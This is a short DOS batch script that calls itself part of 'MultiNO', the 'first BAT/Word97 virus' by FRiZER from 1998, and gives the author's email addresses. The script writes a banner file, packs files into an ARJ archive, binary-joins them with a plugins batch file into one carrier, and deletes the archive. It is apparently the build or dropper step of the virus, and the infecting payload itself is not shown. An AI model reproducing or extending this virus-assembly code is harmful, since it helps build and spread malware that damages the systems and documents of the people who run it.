@echo off
echo @echo off>myxa.bat
echo echo MultiNO - first BAT/Word97 virus by FRiZER'98.>>myxa.bat
echo echo mailto:frizer@bbs.edisoft.ru, frizerrr@usa.net.>>myxa.bat
arj a _multino.arj _*.*>nul
copy /b myxa.bat+_plugins.bat+_multino.arj>nul
del _multino.arj
